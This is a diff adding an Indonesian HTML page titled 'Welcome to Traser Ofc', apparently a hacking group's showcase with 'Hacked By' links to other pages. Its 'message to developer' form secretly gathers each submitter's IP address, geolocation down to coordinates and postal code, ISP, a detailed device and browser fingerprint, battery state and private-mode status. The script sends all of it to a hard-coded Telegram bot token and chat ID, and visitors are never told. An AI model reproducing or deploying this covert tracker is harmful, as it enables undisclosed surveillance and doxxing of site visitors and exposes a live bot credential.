@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Traser Ofc</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: linear-gradient(45deg, #0f2027, #203a43, #2c5364); color: white; text-align: center; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; }
+        .loading-container { position: fixed; width: 100vw; height: 100vh; background: black; display: flex; justify-content: center; align-items: center; z-index: 9999; }
+        .loader { width: 50px; height: 50px; border: 5px solid white; border-top: 5px solid cyan; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .container { display: none; background: rgba(0, 0, 0, 0.8); padding: 20px; border-radius: 10px; box-shadow: 0 0 15px cyan; width: 90%; max-width: 500px; }
+        h1 { font-size: 28px; text-transform: uppercase; animation: glow 1.5s infinite alternate; margin-bottom: 15px; }
+        .btn-container { margin-top: 20px; display: flex; flex-direction: column; gap: 10px; }
+        .btn { padding: 12px; font-size: 16px; color: white; background: linear-gradient(45deg, #00bcd4, #009688); border: none; border-radius: 5px; cursor: pointer; text-decoration: none; transition: 0.3s; font-weight: bold; text-align: center; }
+        .btn:hover { background: linear-gradient(45deg, #009688, #00bcd4); box-shadow: 0 0 10px cyan; }
+        form { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+        input, textarea { width: 100%; padding: 10px; border-radius: 5px; border: none; outline: none; font-size: 16px; }
+        button { padding: 12px; font-size: 16px; background: cyan; border: none; color: black; font-weight: bold; cursor: pointer; border-radius: 5px; transition: 0.3s; }
+        button:hover { background: white; }
+        @keyframes glow { from { text-shadow: 0 0 10px cyan, 0 0 20px cyan; } to { text-shadow: 0 0 20px cyan, 0 0 30px cyan; } }
+    </style>
+</head>
+<body>
+    <!-- Loading -->
+    <div class="loading-container" id="loading">
+        <div class="loader"></div>
+    </div>
+
+    <!-- Konten -->
+    <div class="container" id="mainContent">
+        <h1>Welcome to Traser Ofc</h1>
+
+        <!-- Form Kirim Pesan -->
+        <form id="messageForm">
+            <input type="text" id="name" placeholder="Masukkan Nama Anda" required>
+            <textarea id="message" placeholder="Pesan untuk Developer" required></textarea>
+            <button type="submit">Kirim Pesan</button>
+        </form>
+
+        <!-- Tombol Pilihan -->
+        <div class="btn-container">
+            <a href="page1.html" class="btn">Hacked By Dilxz</a>
+            <a href="page2.html" class="btn">Hacked By Ndax</a>
+            <a href="page3.html" class="btn">Hacked By AnOn</a>
+            <a href="page4.html" class="btn">HUNTER TRASER</a>
+            <a href="page5.html" class="btn">Hacked By Dark.Anggle</a>
+<a href="page6.html" class="btn">BELUM ADA</a>
+<a href="page7.html" class="btn">BELUM ADA</a>
+        </div>
+    </div>
+
+   <script>
+    // Loading Animasi
+    window.onload = function() {
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+        }, 2000);
+    };
+
+    // Kirim Pesan ke Bot Telegram
+    document.addEventListener("DOMContentLoaded", function() {
+        let form = document.getElementById('messageForm');
+        if (!form) {
+            console.error("Form tidak ditemukan!");
+            return;
+        }
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            let name = document.getElementById('name').value;
+            let message = document.getElementById('message').value;
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    let ip = data.ip;
+                    let userAgent = navigator.userAgent;
+                    let language = navigator.language;
+                    let screenWidth = window.screen.width;
+                    let screenHeight = window.screen.height;
+                    let platform = navigator.platform;
+                    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    let now = new Date().toLocaleString();
+                    let cookieEnabled = navigator.cookieEnabled;
+                    let javaEnabled = navigator.javaEnabled();
+                    let onlineStatus = navigator.onLine ? "Online" : "Offline";
+                    let memory = navigator.deviceMemory || "Tidak diketahui";
+                    let cores = navigator.hardwareConcurrency || "Tidak diketahui";
+                    let colorDepth = screen.colorDepth || "Tidak diketahui";
+                    let pixelDepth = screen.pixelDepth || "Tidak diketahui";
+                    let maxTouchPoints = navigator.maxTouchPoints || "Tidak diketahui";
+                    let vendor = navigator.vendor || "Tidak diketahui";
+                    let product = navigator.product || "Tidak diketahui";
+                    let connection = navigator.connection || {};
+                    let networkType = connection.effectiveType || "Tidak diketahui";
+                    let downlink = connection.downlink || "Tidak diketahui";
+                    let rtt = connection.rtt || "Tidak diketahui";
+                    let mimeTypes = navigator.mimeTypes.length;
+                    let plugins = navigator.plugins.length;
+                    let devicePixelRatio = window.devicePixelRatio;
+                    let hardwareConcurrency = navigator.hardwareConcurrency;
+                    let screenOrientation = screen.orientation ? screen.orientation.type : "Tidak diketahui";
+                    let availableScreenWidth = screen.availWidth;
+                    let availableScreenHeight = screen.availHeight;
+                    let isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Ya" : "Tidak";
+                    let isPrivateMode = false;
+                    let batteryLevel = "Tidak diketahui";
+                    let chargingStatus = "Tidak diketahui";
+
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(battery => {
+                            batteryLevel = battery.level * 100 + "%";
+                            chargingStatus = battery.charging ? "Sedang Mengisi" : "Tidak Mengisi";
+                        });
+                    }
+
+                    try {
+                        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                        if (fs) {
+                            fs(window.TEMPORARY, 100, () => isPrivateMode = false, () => isPrivateMode = true);
+                        }
+                    } catch (e) {
+                        isPrivateMode = true;
+                    }
+
+                    // Ambil lokasi dari IP
+                    fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(res => res.json())
+                        .then(locationData => {
+                            let country = locationData.country_name || "Tidak diketahui";
+                            let region = locationData.region || "Tidak diketahui";
+                            let city = locationData.city || "Tidak diketahui";
+                            let isp = locationData.org || "Tidak diketahui";
+                            let postal = locationData.postal || "Tidak diketahui";
+                            let latitude = locationData.latitude || "Tidak diketahui";
+                            let longitude = locationData.longitude || "Tidak diketahui";
+                            let network = locationData.network || "Tidak diketahui";
+                            let asn = locationData.asn || "Tidak diketahui";
+                            let countryCode = locationData.country || "Tidak diketahui";
+                            let currency = locationData.currency || "Tidak diketahui";
+                            let callingCode = locationData.country_calling_code || "Tidak diketahui";
+
+                            let text = `🛑 *Pesan Baru ke Developer* 🛑\n
+                            👤 *Nama:* ${name}
+                            ✉️ *Pesan:* ${message}
+                            📍 *IP:* ${ip}
+                            🏴 *Negara:* ${country} (${countryCode})
+                            ☎️ *Kode Negara:* ${callingCode}
+                            💰 *Mata Uang:* ${currency}
+                            🏙️ *Kota:* ${city}, ${region}
+                            📮 *Kode Pos:* ${postal}
+                            🌍 *Latitude:* ${latitude}
+                            🌏 *Longitude:* ${longitude}
+                            🏢 *ISP:* ${isp}
+                            📡 *Jaringan:* ${network}
+                            🏷️ *ASN:* ${asn}
+                            🌎 *Bahasa Browser:* ${language}
+                            🖥️ *Device:* ${userAgent}
+                            💾 *RAM:* ${memory} GB
+                            🔥 *CPU Cores:* ${cores}
+                            🎨 *Color Depth:* ${colorDepth}-bit
+                            🏿 *Pixel Depth:* ${pixelDepth}-bit
+                            📏 *Resolusi Layar:* ${screenWidth}x${screenHeight}
+                            📐 *Layar Tersedia:* ${availableScreenWidth}x${availableScreenHeight}
+                            💻 *Platform:* ${platform}
+                            📲 *Max Touch Points:* ${maxTouchPoints}
+                            🏭 *Vendor:* ${vendor}
+                            ⚙️ *Product:* ${product}
+                            📶 *Tipe Jaringan:* ${networkType}
+                            🔻 *Downlink Speed:* ${downlink} Mbps
+                            🔄 *RTT:* ${rtt} ms
+                            🔌 *Status Koneksi:* ${onlineStatus}
+                            🔋 *Baterai:* ${batteryLevel}
+                            ⚡ *Status Pengisian:* ${chargingStatus}
+                            🖱️ *Rasio Pixel Perangkat:* ${devicePixelRatio}
+                            🔄 *Orientasi Layar:* ${screenOrientation}
+                            ☕ *Java Aktif:* ${javaEnabled}
+                            🍪 *Cookies Aktif:* ${cookieEnabled}
+                            🏴‍☠️ *Mode Privat:* ${isPrivateMode ? "Ya" : "Tidak"}
+                            🛠️ *Jumlah Plugin Browser:* ${plugins}
+                            📂 *Jumlah MIME Types:* ${mimeTypes}
+                            📲 *Perangkat Sentuh:* ${isTouchDevice}
+                            ⏳ *Zona Waktu:* ${timezone}
+                            ⏰ *Waktu Lokal:* ${now}`;
+
+                            let botToken = "8067311127:AAHBqz2gd7vUB6K2GD_QjxQfiDvtxr61ZK4";
+                            let chatId = "8091706716";
+
+                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+                            })
+                            .then(() => alert("Pesan berhasil dikirim!"))
+                            .catch(err => {
+                                console.error("Gagal mengirim pesan ke Telegram:", err);
+                                alert("Gagal mengirim pesan!");
+                            });
+                        })
+                        .catch(err => {
+                            console.error("Gagal mengambil data lokasi:", err);
+                            alert("Gagal mengambil data lokasi!");
+                        });
+                })
+                .catch(err => {
+                    console.error("Gagal mengambil data IP:", err);
+                    alert("Gagal mengambil data IP!");
+                });
+        });
+    });
+</script>
+</body>
+  </html>
